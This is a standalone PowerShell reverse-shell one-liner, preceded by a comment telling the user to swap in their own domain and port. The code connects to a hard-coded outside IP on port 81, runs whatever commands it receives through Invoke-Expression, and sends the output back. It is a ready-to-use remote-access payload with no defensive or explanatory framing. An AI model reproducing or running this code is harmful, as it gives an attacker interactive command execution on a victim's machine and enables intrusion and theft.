#Change the domain name "shell.theboss.lol" to your domain name and the port number "81" to the port
number ncat is listening to:
$sm=(New-Object
Net.Sockets.TCPClient('51.91.154.146',81)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Re
ad($bt,0,$bt.Length)) -ne 0){;$d=(New-Object
Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d
2>&1));$sm.Write($st,0,$st.Length)}